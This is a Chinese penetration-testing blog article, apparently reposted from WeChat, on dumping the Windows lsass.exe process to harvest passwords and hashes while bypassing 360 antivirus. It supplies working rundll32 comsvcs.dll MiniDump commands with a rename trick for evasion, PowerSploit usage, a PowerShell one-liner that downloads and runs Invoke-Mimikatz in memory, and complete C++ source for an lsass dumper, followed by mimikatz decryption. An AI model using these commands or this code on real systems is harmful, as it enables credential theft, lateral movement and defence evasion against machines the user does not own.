<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/lXliiD6HlxqYht2tj_tXBw)

> 文章来源：乌雲安全

在内网渗透进行横向移动和权限提升时，最常用的方法是通过 dump 进程 lsass.exe，从中获得明文口令或者 hash。lsass.exe（Local Security Authority Subsystem Service）是一个系统进程，用于微软 Windows 系统的安全机制，它用于本地安全和登陆策略。在进程空间中，存有着机器的域、本地用户名和密码等重要信息。但是需要首先获得一个高的权限才能对其进行访问。  

在存在杀软防护的情况下，要想转储 lsass 进程，我首先想到的是 procdump+Mimikatz 的方式来绕过杀软，因为 Procdump 工具是微软自家的，不会引起报毒。但是我在实际测试中发现，这种思路还是会被 360 安全卫士拦截。

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwY2yGKKKwd77IheQY06vAuuFQTO5kDRJTaXVYwCGibLJiaG5rOLIYibnIR7tVBHkD5rIBOtesallu9w/640?wx_fmt=jpeg)

下面几个分享几个我学习到的绕过杀软转储 lsass 方式，目前亲测可过 360 安全卫士，别的杀软我还没有具体测试。下边分享的代码和工具虽然多种多样，但是本质上都是用到了 debugprivilege 和 MiniDump。杀软对 API 的监控不严格导致出现了安全问题。  

使用系统内置功能绕过杀软
------------

comsvcs.dll，系统自带。通过 comsvcs.dll 的导出函数 MiniDump 实现 dump 内存。

在 dump 指定进程内存文件时，需要开启 SeDebugPrivilege 权限。管理员权限的 cmd 下，默认支持 SeDebugPrivilege 权限，但是状态为 Disabled 禁用状态

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavwY2yGKKKwd77IheQY06vAu9N0svkY7ib67q7m64e1tsqWhcHKKLOial2m1Cu7dLn6X9aMU2cYeCYgw/640?wx_fmt=png)

如果直接在 cmd 下执行 rundll32 的命令尝试 dump 指定进程内存文件的话，由于无法开启 SeDebugPrivilege 权限，会 dump 失败。

解决方式：

管理员权限的 powershell 下，默认支持 SeDebugPrivilege 权限，并且状态为已启用。

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavwY2yGKKKwd77IheQY06vAufUBNBfudYHQekLpjMNRwcQmebiaUsUWgiazk75CSoRicHZl4s8Lv23xRQ/640?wx_fmt=png)

首先查看 lsass.exe 进程 PID:  

`tasklist | findstr lsass.exe`

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavwY2yGKKKwd77IheQY06vAu0ocL6BxvRibk3SsAZP8VD8V8B3vpG9Vb5ZduWHCtQXWxBbqc0qlicKQg/640?wx_fmt=png)

命令格式：

`rundll32.exe comsvcs.dll MiniDump <lsass PID> <out path> full`

此处为：

`rundll32.exe comsvcs.dll MiniDump 508 c:\windows\temp full`

直接运行会被拦截:

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavwY2yGKKKwd77IheQY06vAuMNoyGB9B63Lsa8ULGBTr5VQtQQ6Js3XthANMP8Yr4SMCZLuluByXSw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavwY2yGKKKwd77IheQY06vAuu8SMuSwZ3YJcUD9prT4TIUER8cgHz948VRoD4OvUWtsrowHrLGCaAg/640?wx_fmt=png)

简单的绕过思路：  

copy 一下 comsvcs.dll 并命名为随意名字，例如 test.dll

```
copy C:\windows\System32\comsvcs.dll test.dllrundll32.exe test.dll, MiniDump 508 lsass.dmp full
```

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavwY2yGKKKwd77IheQY06vAuYy0tMjX1Rk1pCcqYYORgPm6c6k6c5VKtUWukO8aBCvDNLe8NLK8F6w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavwY2yGKKKwd77IheQY06vAuV4oUz07vB9mLJJZ1afNlCyYSwNuib0j1mvdK6jZGmATnm8ibToGuJ2Vg/640?wx_fmt=png)

成功转储了 lsass  

下载到本地解密。这里有个坑点

我下载到本地后，解密失败。一开始以为保存的时候没有保存全，又试了几次还是没有解密。

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavwY2yGKKKwd77IheQY06vAuWDwjliaWL4CpTek5TX4uiapbbfP16uC0MVo13c6ql8SYUgvqpnlv63jA/640?wx_fmt=png)

经过查询资料得知，是新版的 mimikatz 和 win10 1809 版本之间的问题导致解密失败。详见 https://githubmemory.com/repo/gentilkiwi/mimikatz/issues/354  

换用 mimikatz 1809 版就好了。

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavwY2yGKKKwd77IheQY06vAuYUMFJuxbwDXCPpicUvCssyOwFxUXLsWQyuO77XkQUXQCfyUbLqRSuRQ/640?wx_fmt=png)

成功解密。  

powershell 脚本
-------------

### Out-MiniDump.ps1

使用 PowerSploit 的 Out-MiniDump 模块，PowerSploit 是一个基于 Powershell 的渗透工具包，可以选择创建进程的完整内存转储。工具连接：https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1

`Import-Module Out-MiniDump` 导入

`Get-Process lsass | Out-Minidump` 执行

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavwY2yGKKKwd77IheQY06vAuoWyCBMEmw8XhwQXDgfeB2ibPoXgsOTkiaYSGeiaUYMHKlNvaRDqa78L3g/640?wx_fmt=png)

解密

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavwY2yGKKKwd77IheQY06vAu07IwlgiapM4qEaaNSPql3zibgibpj8SUWOSArqQetF7ibMtywCW5FYxMvA/640?wx_fmt=png)

### 使用 ps 版 mimikatz  

工具地址：https://github.com/fir3d0g/mimidogz

在执行 powershell 脚本的时候，常常采用

powershell "IEX (New-Object Net.WebClient).DownloadString ('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz"

远程加载的方式，达到文件不落地来更好的规避检测的目的，但是如果目标机器网络环境不允许的话，那就直接把 ps1 上传到目标机器来运行。

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavwY2yGKKKwd77IheQY06vAuicFNuqqswXYhAn7AcJmevicKRib0wQ8AibqRP758OjKVYCnjjvhyh1rzicw/640?wx_fmt=png)

应用程序  

-------

```
#include <windows.h>#include <DbgHelp.h>#include <iostream>#include <TlHelp32.h>#pragma comment ( lib, "dbghelp.lib" )using namespace std;#define INFO_BUFFER_SIZE 32767std::wstring s2ws(const std::string& s){    int len;    int slength = (int)s.length() + 1;    len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);    wchar_t* buf = new wchar_t[len];    MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);    std::wstring r(buf);    delete[] buf;    return r;}// 提升权限为 debugbool EnableDebugPrivilege(){    HANDLE hToken;    LUID sedebugnameValue;    TOKEN_PRIVILEGES tkp;    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))    {        return   FALSE;    }    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue)) //修改进程权限    {        CloseHandle(hToken);        return false;    }    tkp.PrivilegeCount = 1;    tkp.Privileges[0].Luid = sedebugnameValue;    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) //通知系统修改进程权限    {        CloseHandle(hToken);        return false;    }    return true;}int main() {    char filename[INFO_BUFFER_SIZE];    char infoBuf[INFO_BUFFER_SIZE];    DWORD  bufCharCount = INFO_BUFFER_SIZE;    GetComputerNameA(infoBuf, &bufCharCount);    strcpy_s(filename, infoBuf);    strcat_s(filename, "-");    strcat_s(filename, "lsass.dmp");    DWORD lsassPID = 0;    HANDLE lsassHandle = NULL;    HANDLE outFile = CreateFileA(filename, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);    PROCESSENTRY32 processEntry = {};  // 拍摄快照时驻留在系统地址空间里的进程列表结构体    processEntry.dwSize = sizeof(PROCESSENTRY32);   //结构大小    LPCWSTR processName = L"";  //进程名    if (Process32First(snapshot, &processEntry)) {  //检索快照中第一个进程的信息        while (_wcsicmp(processName, L"lsass.exe") != 0) {  //循环检索快照中的进程            Process32Next(snapshot, &processEntry);            processName = processEntry.szExeFile;   // 获取当前进程的进程名            lsassPID = processEntry.th32ProcessID;        }        wcout << "[+] Got lsass.exe PID: " << lsassPID << endl;    }    if (EnableDebugPrivilege() == false)    {        printf("enable %d", GetLastError());    }    EnableDebugPrivilege();    lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID); // 根据 Pid 打开 lsass.exe 进程，获取句柄    BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL); //转储lsass，写入outfile    if (isDumped) {        cout << "[+] Save To " << filename << endl;        cout << "[+] lsass dumped successfully!" << endl;    }    return 0;}
```

上边的代码来源是吐司 https://www.t00ls.net/viewthread.php?tid=54000&extra=&page=1

是我学习此知识点过程中遇到的考虑最完善的代码，他的代码相比较其他师傅的代码考虑了更多情况，比如说为了避免权限不足打不开 lsass 进程而导致 dmp 文件为空的情况，新增了提权函数加以验证。

程序运行分为以下几步：

1. 提升权限。因为 lsass 进程的权限为 system 权限，所以想要对其操作首先要提升自身进程权限为 debug 权限。

2. 对所有进程拍摄快照，然后循环检索 lsass 进程 id

3. 将 lsass 内存的快照进行转储，并写入文件

将代码编译成 exe，运行看一下效果

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavwY2yGKKKwd77IheQY06vAuicmof4ryBln5lZAECGkyzT0qMZJeGeS3zqibse2CTiaO53VPEbhhZKpxw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavwY2yGKKKwd77IheQY06vAuaEvAJmhemFYuofD6iaGMZwB6vofmVNa3vXXYzXia5Ha70B2Bll9wcJIA/640?wx_fmt=png)

成功转储。  

放到装有 360 安全卫士的目标机器上运行，目标机器为 win 2008 R2 64 位系统

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavwY2yGKKKwd77IheQY06vAu0B7oe6O7rDJK7oFkqlULxRnkmCbwvLvOW2H94KZ1gay7CqhPSnk4kQ/640?wx_fmt=png)

运行提示缺少 dll，下载对应 dll 移动到 c:/windows/system32 目录下

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavwY2yGKKKwd77IheQY06vAufXeWLDbZIF0yDmUkMibjcQDonCIPhS09OA3nRS4cuhQb7CPUSBDaXqg/640?wx_fmt=png)

重新运行 exe 程序

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavwY2yGKKKwd77IheQY06vAuBMY1K9X7ZmhZ0LnibB0hSlx7GHppweTk6lTxL9ODqTZYdAJxiacGBlBw/640?wx_fmt=png)

成功转储。  

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavwY2yGKKKwd77IheQY06vAuxtUiblaibHVnPFqKLpeibZ3l5FQXs94gmARuOR6OtspabDHribGdJZC8Lw/640?wx_fmt=png)

使用 mimikatz 解密成功。

我在学习过程中，习惯用多个方法来解决一个问题。一是没有那种万能方法，能为我通杀所有的环境，同问题不多考虑几种方法的话，我本身会觉得比较虚；二是也趁着对同知识点学习的惯性，多手法之间能够融会贯通一下，免得在学同类型知识点就忘了以前是咋回事了。前人栽树，后人乘凉。本文是在学习师傅们思路手法的基础上，形成的一篇总结性的文章，在自己记录的同时，希望能帮到其他人。

**参考链接：**

https://githubmemory.com/repo/gentilkiwi/mimikatz/issues/354  
https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1  
https://www.t00ls.net/viewthread.php?tid=54000&extra=&page=1  
[https://mp.weixin.qq.com/s/IA42D6hjvk4Bld65Wahuag](https://mp.weixin.qq.com/s?__biz=Mzg3MDUwMjE3Nw==&mid=2247484205&idx=1&sn=1b3941ec1f89ede69790c955f14cda9c&scene=21#wechat_redirect)  
https://_thorns.gitbooks.io/sec/content/powershell.html  
https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass  
https://www.t00ls.net/viewthread.php?tid=54000&extra=&page=2  
https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf  
https://www.t00ls.net/thread-62435-1-1.html

作者：DR0s1，转载于先知社区  

**【往期推荐】**  

[【内网渗透】内网信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485796&idx=1&sn=8e78cb0c7779307b1ae4bd1aac47c1f1&chksm=ea37f63edd407f2838e730cd958be213f995b7020ce1c5f96109216d52fa4c86780f3f34c194&scene=21#wechat_redirect)  

[【内网渗透】域内信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485855&idx=1&sn=3730e1a1e851b299537db7f49050d483&chksm=ea37f6c5dd407fd353d848cbc5da09beee11bc41fb3482cc01d22cbc0bec7032a5e493a6bed7&scene=21#wechat_redirect)

[【超详细 | Python】CS 免杀 - Shellcode Loader 原理 (python)](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486582&idx=1&sn=572fbe4a921366c009365c4a37f52836&chksm=ea37f32cdd407a3aea2d4c100fdc0a9941b78b3c5d6f46ba6f71e946f2c82b5118bf1829d2dc&scene=21#wechat_redirect)

[【超详细 | Python】CS 免杀 - 分离 + 混淆免杀思路](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486638&idx=1&sn=99ce07c365acec41b6c8da07692ffca9&chksm=ea37f3f4dd407ae28611d23b31c39ff1c8bc79762bfe2535f12d1b9d7a6991777b178a89b308&scene=21#wechat_redirect)  

[【超详细 | 钟馗之眼】ZoomEye-python 命令行的使用](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247488453&idx=1&sn=5828a0e1a2299d3ee0215f0ed4c30bf1&chksm=ea37ec9fdd406589124c67c45487be39ed1033d88c627092cf07f6d4f14ccdb9079b38dba74d&scene=21#wechat_redirect)  

[【超详细 | 附 EXP】Weblogic CVE-2021-2394 RCE 漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247488922&idx=1&sn=f43e3c243bbbfd2822867a3acaa8b85e&chksm=ea37eac0dd4063d63d98f935c73ce571cbfeb0e7272a6f171a28143bdb3e7134b09ea874969a&scene=21#wechat_redirect)

[【超详细】CVE-2020-14882 | Weblogic 未授权命令执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485550&idx=1&sn=921b100fd0a7cc183e92a5d3dd07185e&chksm=ea37f734dd407e22cfee57538d53a2d3f2ebb00014c8027d0b7b80591bcf30bc5647bfaf42f8&scene=21#wechat_redirect)

[【超详细 | 附 PoC】CVE-2021-2109 | Weblogic Server 远程代码执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486517&idx=1&sn=34d494bd453a9472d2b2ebf42dc7e21b&chksm=ea37f36fdd407a7977b19d7fdd74acd44862517aac91dd51a28b8debe492d54f53b6bee07aa8&scene=21#wechat_redirect)

[【漏洞分析 | 附 EXP】CVE-2021-21985 VMware vCenter Server 远程代码执行漏洞](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247487906&idx=1&sn=e35998115108336f8b7c6679e16d1d0a&chksm=ea37eef8dd4067ee13470391ded0f1c8e269f01bcdee4273e9f57ca8924797447f72eb2656b2&scene=21#wechat_redirect)

[【CNVD-2021-30167 | 附 PoC】用友 NC BeanShell 远程代码执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247487897&idx=1&sn=6ab1eb2c83f164ff65084f8ba015ad60&chksm=ea37eec3dd4067d56adcb89a27478f7dbbb83b5077af14e108eca0c82168ae53ce4d1fbffabf&scene=21#wechat_redirect)  

[【奇淫巧技】如何成为一个合格的 “FOFA” 工程师](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485135&idx=1&sn=f872054b31429e244a6e56385698404a&chksm=ea37f995dd40708367700fc53cca4ce8cb490bc1fe23dd1f167d86c0d2014a0c03005af99b89&scene=21#wechat_redirect)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[【超详细】Microsoft Exchange 远程代码执行漏洞复现【CVE-2020-17144】](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485992&idx=1&sn=18741504243d11833aae7791f1acda25&chksm=ea37f572dd407c64894777bdf77e07bdfbb3ada0639ff3a19e9717e70f96b300ab437a8ed254&scene=21#wechat_redirect)

[【超详细】Fastjson1.2.24 反序列化漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=1&sn=1178e571dcb60adb67f00e3837da69a3&chksm=ea37f965dd4070732b9bbfa2fe51a5fe9030e116983a84cd10657aec7a310b01090512439079&scene=21#wechat_redirect)

 [记一次 HW 实战笔记 | 艰难的提权爬坑](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=2&sn=5368b636aed77ce455a1e095c63651e4&chksm=ea37f965dd407073edbf27256c022645fe2c0bf8b57b38a6000e5aeb75733e10815a4028eb03&scene=21#wechat_redirect)

_**走过路过的大佬们留个关注再走呗**_![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEATexewVNVf8bbPg7wC3a3KR1oG1rokLzsfV9vUiaQK2nGDIbALKibe5yauhc4oxnzPXRp9cFsAg4Q/640?wx_fmt=png)

**往期文章有彩蛋哦****![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTHtVfEjbedItbDdJTEQ3F7vY8yuszc8WLjN9RmkgOG0Jp7QAfTxBMWU8Xe4Rlu2M7WjY0xea012OQ/640?wx_fmt=png)**  

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTECbvcv6VpkwD7BV8iaiaWcXbahhsa7k8bo1PKkLXXGlsyC6CbAmE3hhSBW5dG65xYuMmR7PQWoLSFA/640?wx_fmt=png)

一如既往的学习，一如既往的整理，一如即往的分享。![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icl7QVywL8iaGT0QBGpOwgD1IwN0z9JicTRvzvnsJicNRr2gRvJib6jKojzC5CJJsFPkEbZQJ999HrH5Gw/640?wx_fmt=png)  

“**如侵权请私聊公众号删文**”

公众号